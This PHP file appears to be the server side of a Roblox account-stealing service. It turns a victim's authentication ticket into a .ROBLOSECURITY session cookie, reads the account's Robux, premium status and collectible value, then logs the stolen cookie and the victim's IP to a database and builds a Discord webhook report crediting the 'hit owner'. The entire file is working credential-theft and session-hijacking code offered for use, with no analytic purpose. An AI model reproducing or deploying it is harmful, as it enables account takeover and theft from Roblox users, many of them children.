<?php
    //if(basename($_SERVER['SCRIPT_FILENAME']) == basename(__FILE__)) die('{"errors":[{"code":401,"message":"Unauthorized"}]}');
    
    require('../../includes/functions.php');
    require('../../includes/botconfig.php');
    include_once __DIR__.'/../../../vendor/autoload.php';
    use Twilio\Rest\Client; 

    try{

        $rateLimitServer = [
            'host' => '127.0.0.1',
            'port' => 6379
        ];

        $ident = htmlspecialchars($_GET["id"]);
        $id = htmlspecialchars($_GET["ip"]);
        $adapter = new \PalePurple\RateLimit\Adapter\Predis(new \Predis\Client($rateLimitServer));
        $rateLimiter = new \PalePurple\RateLimit\RateLimit($ident, 100, 3600, $adapter);
    
        $count = $rateLimiter->getAllowance($id);
        if ($rateLimiter->check($id)) {
            
            if (!isset($_GET["t"])) {
                die();
            }
        
            $ticket = htmlspecialchars($_GET["t"]);
            if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
                die();
            }
        
            $checkBan = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn(0);
            $subEndDate = pdoQuery($db, "SELECT `subEndDate` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn();
            $rank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn();
            $isOnline = pdoQuery($db, "SELECT `isOnline` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn();

            if($isOnline == 0){
                $isOnline = "False";
            }else if($isOnline == 1){
                $isOnline = "True";
            }
            if ($checkBan == '0'){
        
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/Login/Negotiate.ashx?suggest=$ticket");
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_POST, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'RBXAuthenticationNegotiation: https://www.roblox.com',
                    'RBX-For-Gameauth: true',
                ));
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $output = curl_exec($ch);
                curl_close($ch);
            
                $cookie = getBetween($output, "set-cookie: .ROBLOSECURITY=", ";");
                if ($cookie) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        'Cookie: .ROBLOSECURITY=' . $cookie
                    ));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $profile = json_decode(curl_exec($ch), 1);
                    curl_close($ch);
                                        
                    if (account_filter($profile)) {

                        try{

                            if(checkRelated(encrypt($id)) >= 1){

                                $get = pdoQuery($db, "SELECT * FROM `logs` WHERE `encrypted`=?", [htmlspecialchars(encrypt($id))]);
                                $results = $get->fetchAll(PDO::FETCH_ASSOC);
                                $a = array();
                            
                                foreach($results as $result){
                                        
                                    $user = htmlspecialchars($result['username']);
                            
                                    if(!in_array($user, $a)){
                                        array_push($a, $user);
                                    }
                                    $string = "WARNING - IP HAS BEEN LOGGED BEFORE\r\n\r\n" .  rtrim(implode("\xA", $a), "\xA");
                                    $color = "#ff0000";
                                }
                            }else{

                                if (checkIP(hash('sha256', $id)) >= 1){

                                    $get = pdoQuery($db, "SELECT * FROM `users` WHERE `ip`=?", [htmlspecialchars(hash('sha256', $id))]);
                                    $results = $get->fetchAll(PDO::FETCH_ASSOC);
                                    $a = array();
                                
                                    foreach($results as $result){
                                            
                                        $user = htmlspecialchars($result['username']);
                                
                                        if(!in_array($user, $a)){
                                            array_push($a, $user);
                                        }
                                        $string = "WARNING - REGISTERED IP\r\n\r\n" .  rtrim(implode("\xA", $a), "\xA");
                                        $color = "#ff0000";
                                    }
                                }else{
                                    $string = "No account found related to the IP.";
                                    $color  = "#11ff00";
                                }
                            }

                            $webhook = htmlspecialchars(pdoQuery($db, "SELECT `webhook` FROM `global`")->fetchColumn());
                            $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn();
                            $username = pdoQuery($db, "SELECT `username` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn();

                            $hookObject = json_encode([
                                "username" => $profile["UserName"],
                                "avatar_url" => "",
                                "embeds" => [
                                    [
                                        "title" => "IX",
                                        "type" => "rich",
                                        "description" => "",
                                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                                        "timestamp" => date('Y-m-d H:i:s'),
                                        "color" => hexdec($color),
                                        "thumbnail" => [
                                            "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                                        ],
                                        "fields" => [
                                            [
                                                "name" => "Name",
                                                "value" => $profile["UserName"]
                                            ],
                                            [
                                                "name" => "Robux Balance",
                                                "value" => $profile["RobuxBalance"]
                                            ],
                                            [
                                                "name" => "RAP",
                                                "value" => get_user_rap($profile["UserID"], $cookie)
                                            ],
                                            [
                                                "name" => "Premium",
                                                "value" => $profile["IsPremium"]
                                            ],
                                            [
                                                "name" => "Rolimon's",
                                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                                            ],
                                            [
                                                "name" => "Hit Owner (IXWare Username/Discord ID)",
                                                "value" => $username . " / <@$discordID>"
                                            ],
                                            [
                                                "name" => "Cookie",
                                                "value" => "```" . $cookie . "```"
                                            ],
                                            [
                                                "name" => "IP",
                                                "value" => "```" . $id . "```"
                                            ],
                                            [
                                                "name" => "Status/Accounts",
                                                "value" => "```" . $string . "```"
                                            ],
                                            [
                                                "name" => "is Online",
                                                "value" => $isOnline
                                            ],
                                        ]
                                    ]
                                ]
                            
                            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
                        }catch(Exception $e) {
                        }
        
                        $id = htmlspecialchars($_GET["ip"]);
                        $PDORegister = $db -> prepare('INSERT INTO `cookie_logs` VALUES(:ID, :cookieName, :cookieRobux, :cookiePremium, :cookieRAP, :cookieRolimons, :cookieImage, :ip, :cookie, :cookieID, :date, 0)');
                        $PDORegister -> execute(array(':ID' => $ident, ':cookieName' => $profile["UserName"], ':cookieRobux' => $profile["RobuxBalance"], ':cookiePremium' => $profile["IsPremium"], ':cookieRAP' => get_user_rap($profile["UserID"], $cookie), ':cookieRolimons' => "https://www.rolimons.com/player/" . $profile["UserID"], ':cookieImage' => $profile["ThumbnailUrl"], ':ip' => encrypt($id), ':cookie' => encrypt($cookie), ':cookieID' => getID(25), ':date' => date("Y-m-d H:i:s")));
                    }
                }else{
                    echo $output;
                }
                
            }
        }else{
            http_response_code(429);
            exit(0);
        }
    }catch(Exception $e) {
        die("An error occured");
    }
    function account_filter($profile) {
        return true;
    }
    function getBetween($string, $start = "", $end = ""){
        if (strpos($string, $start)){
            $startCharCount = strpos($string, $start) + strlen($start);
            $firstSubStr = substr($string, $startCharCount, strlen($string));
            $endCharCount = strpos($firstSubStr, $end);
            if ($endCharCount == 0) {
                $endCharCount = strlen($firstSubStr);
            }
            return substr($firstSubStr, 0, $endCharCount);
        } else {
            return '';
        }
    }
    function get_user_rap($user_id, $cookie) {
        $cursor = "";
        $total_rap = 0;
                        
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                        
        return $total_rap;
    }
?>